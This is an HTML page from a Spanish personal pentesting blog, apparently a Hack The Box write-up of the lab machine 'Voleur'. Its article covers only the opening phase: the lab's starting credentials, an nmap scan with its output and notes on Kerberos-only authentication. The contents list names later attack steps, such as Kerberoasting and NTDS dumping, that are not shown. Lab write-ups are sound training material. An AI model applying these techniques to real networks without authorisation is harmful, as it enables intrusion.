@@ -1,0 +1,1931 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../sendai/">
+      
+      
+        <link rel="next" href="../../../herramientas/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/lucifer.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>🦊 Voleur - Bitácora de javik</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../estilos/gruvbox.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#maquina-voleur" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../../.." title="Bitácora de javik" class="md-header__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../../assets/lucifer.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Bitácora de javik
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              🦊 Voleur
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Bitácora de javik" class="md-nav__button md-logo" aria-label="Bitácora de javik" data-md-component="logo">
+      
+  <img src="../../../assets/lucifer.png" alt="logo">
+
+    </a>
+    Bitácora de javik
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 Bitácora de javik
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../certificaciones/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏆 CERTIFICACIONES
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../metodologia-ad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🕸️ METODOLOGÍA AD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mi-entorno/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🖥️ MI ENTORNO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💀 MÁQUINAS HTB
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💀 MÁQUINAS HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../administrator/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💻 Administrator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../babytwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛡️ BabyTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../delegate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔑 Delegate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tombwatcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⏳ TombWatcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../escapetwo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🚪 EscapeTwo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../breach/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⚡ Breach
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../media/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎬 Media
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authority/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏛️ Authority
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sendai/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏢 Sendai
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🦊 Voleur
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🦊 Voleur
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#fase-1-reconocimiento-y-enumeracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fase 1: Reconocimiento y Enumeración
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Fase 1: Reconocimiento y Enumeración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#identificacion-de-ntlm-deshabilitado-y-configuracion-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identificación de NTLM Deshabilitado y Configuración Kerberos
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rastreo-smb-y-analisis-de-excel-protegido" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rastreo SMB y Análisis de Excel Protegido
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#acceso-inicial-user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Acceso Inicial (User Flag)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Acceso Inicial (User Flag)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recoleccion-de-datos-con-bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recolección de Datos con BloodHound
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#abuso-de-writespn-y-ataque-de-kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Abuso de WriteSPN y Ataque de Kerberoasting
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conexion-evil-winrm-via-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conexión Evil-WinRM vía Kerberos
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#movimiento-lateral-y-escalada-de-privilegios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Movimiento Lateral y Escalada de Privilegios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Movimiento Lateral y Escalada de Privilegios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#restauracion-de-objeto-eliminado-con-runascs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Restauración de Objeto Eliminado con RunasCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extraccion-de-credenciales-dpapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extracción de Credenciales DPAPI
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#acceso-a-jeremy-combs-y-descubrimiento-de-wsl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Acceso a Jeremy Combs y Descubrimiento de WSL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#volcado-offline-de-ntds-y-root-de-dominio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Volcado Offline de NTDS y Root de Dominio
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../herramientas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛠️ HERRAMIENTAS
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🛠️ HERRAMIENTAS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/nxc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⚡ NetExec (NXC)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/sliver-c2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🗡️ Sliver C2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/seimpersonate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎭 SeImpersonatePrivilege
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/mssql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🗄️ Enumeración MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../herramientas/chisel-pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔌 Chisel & Pivoting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../mis-notas/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MIS NOTAS
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    MIS NOTAS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/configuracion-ad-basico/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏰 Configuración de AD Básico
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/ataques-adcs-esc1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📜 Abuso de AD CS (ESC1)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/como-funciona-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🛡️ ¿Cómo Funciona Kerberos?
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/tipos-de-tickets-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎫 Tipos de Tickets Kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/creacion-de-tickets/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎟️ Creación de Tickets (Golden y Silver)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mis-notas/kerberos-ataques/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔥 Ataques Kerberos (AS-REP Roasting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#fase-1-reconocimiento-y-enumeracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fase 1: Reconocimiento y Enumeración
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Fase 1: Reconocimiento y Enumeración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#identificacion-de-ntlm-deshabilitado-y-configuracion-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identificación de NTLM Deshabilitado y Configuración Kerberos
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rastreo-smb-y-analisis-de-excel-protegido" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rastreo SMB y Análisis de Excel Protegido
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#acceso-inicial-user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Acceso Inicial (User Flag)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Acceso Inicial (User Flag)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recoleccion-de-datos-con-bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recolección de Datos con BloodHound
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#abuso-de-writespn-y-ataque-de-kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Abuso de WriteSPN y Ataque de Kerberoasting
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conexion-evil-winrm-via-kerberos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conexión Evil-WinRM vía Kerberos
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#movimiento-lateral-y-escalada-de-privilegios" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Movimiento Lateral y Escalada de Privilegios
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Movimiento Lateral y Escalada de Privilegios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#restauracion-de-objeto-eliminado-con-runascs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Restauración de Objeto Eliminado con RunasCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extraccion-de-credenciales-dpapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extracción de Credenciales DPAPI
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#acceso-a-jeremy-combs-y-descubrimiento-de-wsl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Acceso a Jeremy Combs y Descubrimiento de WSL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#volcado-offline-de-ntds-y-root-de-dominio" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Volcado Offline de NTDS y Root de Dominio
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="maquina-voleur">Máquina: Voleur<a class="headerlink" href="#maquina-voleur" title="Permanent link">&para;</a></h1>
+<ul>
+<li><strong>Sistema Operativo:</strong> Windows / Linux (WSL)</li>
+<li><strong>Dificultad:</strong> Media / Difícil</li>
+<li><strong>Técnicas clave:</strong> Entorno Kerberos-only (NTLM deshabilitado), Enumeración SMB (<code>spider_plus</code>), Cracking de Excel protegido (<code>office2john</code> + <code>msoffcrypto-tool</code>), Abuso de <code>WriteSPN</code>, Kerberoasting con TGS, Evil-WinRM con Kerberos, Ejecución con <code>RunasCs.exe</code>, Restauración de objetos eliminados (<code>Restore-ADObject</code>), Desencriptación de DPAPI (<code>dpapi.py</code>), SSH a WSL en puerto 2222, <code>sudo NOPASSWD: ALL</code>, Volcado offline de NTDS (<code>secretsdump.py</code>), Obtención de TGT con hash (<code>getTGT.py</code>)</li>
+</ul>
+<hr />
+<p><img alt="Voleur" src="../assets/Pasted%20image%2020260924211331.png" /></p>
+<blockquote>
+<p><strong>Contexto inicial:</strong> Como es habitual en auditorías de Active Directory corporativas, iniciamos la máquina con credenciales iniciales de un empleado de la organización: <code>ryan.naylor</code> / <code>HollowOct31Nyt</code>.</p>
+</blockquote>
+<h2 id="fase-1-reconocimiento-y-enumeracion">Fase 1: Reconocimiento y Enumeración<a class="headerlink" href="#fase-1-reconocimiento-y-enumeracion" title="Permanent link">&para;</a></h2>
+<p>Iniciamos con un escaneo exhaustivo de puertos utilizando Nmap:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sVC<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-sS<span class="w"> </span><span class="m">10</span>.129.232.130<span class="w"> </span>-oN<span class="w"> </span>escaneo
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Nmap scan report for 10.129.232.130
+Host is up (0.14s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-25 05:15:32Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
+|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
+|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time:
+|   date: 2026-09-25T05:15:44
+|_  start_date: N/A
+|_clock-skew: 7h59m59s
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+</code></pre></div>
+<p>Configuramos la resolución DNS añadiendo <code>voleur.htb</code> y <code>dc.voleur.htb</code> a <code>/etc/hosts</code>:</p>
+<p><img alt="Configuración DNS" src="../assets/Pasted%20image%2020260924212051.png" /></p>
+<h3 id="identificacion-de-ntlm-deshabilitado-y-configuracion-kerberos">Identificación de NTLM Deshabilitado y Configuración Kerberos<a class="headerlink" href="#identificacion-de-ntlm-deshabilitado-y-configuracion-kerberos" title="Permanent link">&para;</a></h3>
+<p>Al intentar autenticarnos con NetExec descubrimos que NTLM se encuentra totalmente deshabilitado (<code>NTLM:False</code>):</p>
+<p><img alt="NTLM Deshabilitado" src="../assets/Pasted%20image%2020260925054344.png" /></p>
+<p><img alt="Error NetExec NTLM" src="../assets/Pasted%20image%2020260925054504.png" /></p>
